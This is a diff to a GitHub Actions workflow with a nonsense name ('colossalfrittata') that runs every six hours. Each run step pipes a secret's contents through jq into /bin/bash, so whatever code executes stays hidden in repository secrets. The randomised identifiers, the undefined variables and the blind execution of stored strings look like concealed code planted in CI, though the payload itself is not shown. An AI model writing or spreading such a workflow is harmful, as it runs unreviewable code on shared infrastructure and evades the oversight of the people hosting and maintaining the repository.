@@ -1,9 +1,9 @@
 name: colossalfrittata
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
-
+    - cron: '43 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,22 +12,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: colossalfrittata
         env:
-          pwg2: ${{ secrets.pwg2 }}
+          le04: ${{ secrets.le04 }}
         run: |
-          echo $pwg2 | jq -r .iav3464 | /bin/bash
-          echo $wys65 | jq -r .aww50 | /bin/bash
-          echo $hgvh55771 | jq -r .muwv6 | /bin/bash
-          echo $ypwzs5 | jq -r .etas0542 | /bin/bash
-          echo $rznws526 | jq -r .s22816 | /bin/bash
-          echo $znmru774 | jq -r .u395 | /bin/bash
-          echo $x53 | jq -r .bdubw9083 | /bin/bash
-          echo $m03989 | jq -r .gzrtr4 | /bin/bash
-          echo $awfy31310 | jq -r .n13743 | /bin/bash
-          echo $lois7663 | jq -r .ex27 | /bin/bash
-          echo $yfm92 | jq -r .qshp0 | /bin/bash
-          echo $bym3727 | jq -r .edm45134 | /bin/bash
-          echo $rmlex5 | jq -r .gmutx29 | /bin/bash
-          echo $doq8 | jq -r .rxhfx3708 | /bin/bash
-          echo $hpgcf4 | jq -r .yls888 | /bin/bash
-          echo $pinp75421 | jq -r .g9614 | /bin/bash
+          echo $le04 | jq -r .gcq263 | /bin/bash
+          echo $yrci885 | jq -r .tnn20 | /bin/bash
 
